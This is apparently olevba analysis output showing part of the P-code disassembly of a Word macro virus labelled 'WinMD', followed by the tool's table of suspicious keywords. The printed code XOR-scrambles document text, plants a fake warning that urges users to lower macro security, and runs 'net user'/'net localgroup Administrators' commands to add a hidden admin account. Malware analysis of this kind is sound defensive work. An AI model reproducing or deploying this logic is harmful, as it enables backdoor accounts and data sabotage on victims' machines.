' 	LineInput 
' Line #150:
' 	Ld s$ 
' 	LitStr 0x0006 "'WinMD"
' 	Eq 
' 	LoopUntil 
' Line #151:
' 	StartForVariable 
' 	Ld C 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld I 
' 	For 
' Line #152:
' 	Ld C 
' 	ArgsLd SARRAY 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld C 
' 	ArgsLd SARRAY 0x0001 
' 	ArgsLd scramble 0x0001 
' 	PrintItemNL 
' 	EndIf 
' Line #153:
' 	StartForVariable 
' 	Next 
' Line #154:
' 	Ld s$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld s$ 
' 	ArgsLd scramble 0x0001 
' 	PrintItemNL 
' 	EndIf 
' Line #155:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #156:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #157:
' 	EndSub 
' Line #158:
' 	FuncDefn (Private Sub trigger())
' Line #159:
' 	OnError (Resume Next) 
' Line #160:
' 	ArgsCall Read 0x0000 
' Line #161:
' 	Ld ActiveDocument 
' 	MemLd Paragraphs 
' 	MemLd Count 
' 	LitDI2 0x000A 
' 	Gt 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemLd Range 
' 	MemLd Then 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "  .  "
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	LitDI2 0x0004 
' 	Lt 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #162:
' 	ArgsCall Read 0x0000 
' Line #163:
' 	Ld ActiveDocument 
' 	MemLd Paragraphs 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #164:
' 	Ld I 
' 	Ld ActiveDocument 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemLd Range 
' 	MemLd Then 
' 	Ld I 
' 	Ld ActiveDocument 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemLd Range 
' 	MemLd Then 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0015 " ([WinMD] rulezzz...)"
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld I 
' 	Ld ActiveDocument 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemLd Range 
' 	MemSt Then 
' Line #165:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed fileformat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #166:
' 	EndIfBlock 
' Line #167:
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x000A "Windows NT"
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0032 0x0005 "WinMD"
' Line #168:
' 	LitStr 0x0013 "net user WinMD /add"
' 	Paren 
' 	ArgsCall Shell 0x0001 
' Line #169:
' 	Ld Application 
' 	MemLd Language 
' 	Ld msoLanguageIDRussian 
' 	Eq 
' 	IfBlock 
' Line #170:
' 	LitStr 0x0028 "net localgroup Àäìèíèñòðàòîðû WinMD /add"
' 	Paren 
' 	ArgsCall Shell 0x0001 
' Line #171:
' 	ElseBlock 
' Line #172:
' 	LitStr 0x0028 "net localgroup Administrators WinMD /add"
' 	Paren 
' 	ArgsCall Shell 0x0001 
' Line #173:
' 	EndIfBlock 
' Line #174:
' 	EndIfBlock 
' Line #175:
' 	EndSub 
' Line #176:
' 	FuncDefn (Private Sub encode(diri))
' Line #177:
' 	OnError (Resume Next) 
' Line #178:
' 	Ld diri 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Ld diri 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemLd Range 
' 	MemLd Then 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "  Âíèìà"
' 	Eq 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemLd Range 
' 	MemLd Then 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "  Warni"
' 	Eq 
' 	Paren 
' 	Or 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #179:
' 	Ld ActiveDocument 
' 	MemLd Paragraphs 
' 	MemLd Count 
' 	St L 
' Line #180:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld L 
' 	For 
' Line #181:
' 	Ld n 
' 	Ld ActiveDocument 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemLd Range 
' 	MemLd Then 
' 	Ld n 
' 	Ld ActiveDocument 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemLd Range 
' 	MemLd Then 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St OLD 
' Line #182:
' 	Ld OLD 
' 	FnLen 
' 	St L 
' Line #183:
' 	LitStr 0x0000 ""
' 	St newtext 
' Line #184:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld L 
' 	For 
' Line #185:
' 	Ld OLD 
' 	Ld I 
' 	Ld L 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St char 
' Line #186:
' 	Ld char 
' 	LitDI2 0x0004 
' 	Xor 
' 	St newchar 
' Line #187:
' 	Ld newtext 
' 	Ld newchar 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St newtext 
' Line #188:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #189:
' 	Ld n 
' 	Ld L 
' 	Lt 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	Ld newtext 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld n 
' 	Ld ActiveDocument 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemLd Range 
' 	MemSt Then 
' 	EndIf 
' Line #190:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	NextVar 
' Line #191:
' 	EndIfBlock 
' Line #192:
' 	Ld diri 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #193:
' 	QuoteRem 0x0004 0x0033 "If Application.Language = msoLanguageIDRussian Then"
' Line #194:
' 	LitStr 0x00CA "  Âíèìàíèå! Íå óäàëîñü çàïóñòèòü ìàêðîñ îòâå÷àþùèé çà êîäèðîâêó òåêñòà! Òåêñò ìîæåò îòîáðàæàòüñÿ íåïðàâèëüíî. Ïðîâåðüòå, ÷òî â ìåíþ Ñåðâèñ | Ìàêðîñ | Áåçîïàñíîñòü óñòàíîâëåí ñðåäíèé óðîâåíü áåçîïàñíîñòè"
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemLd Range 
' 	MemLd Then 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemLd Range 
' 	MemSt Then 
' Line #195:
' 	QuoteRem 0x0004 0x0004 "Else"
' Line #196:
' 	QuoteRem 0x0004 0x010F "    ActiveDocument.Paragraphs(1).Range.Text = "  Warning! At least one macro from this document can't be loaded. Text can't be displayed properly. Try to set medium security level in Tools | Macro | Security... " + Chr(10) + ActiveDocument.Paragraphs(1).Range.Text 'WinMD"
' Line #197:
' 	QuoteRem 0x0004 0x0006 "End If"
' Line #198:
' 	EndIfBlock 
' Line #199:
' 	Ld diri 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemLd Range 
' 	MemLd Then 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "$$Æéìèä"
' 	Eq 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemLd Range 
' 	MemLd Then 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "$$Sevjm"
' 	Eq 
' 	Paren 
' 	Or 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemLd Range 
' 	MemSt Then 
' 	EndIf 
' Line #200:
' 	EndSub 
' Line #201:
' 	QuoteRem 0x0000 0x0005 "WinMD"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|copyfile            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

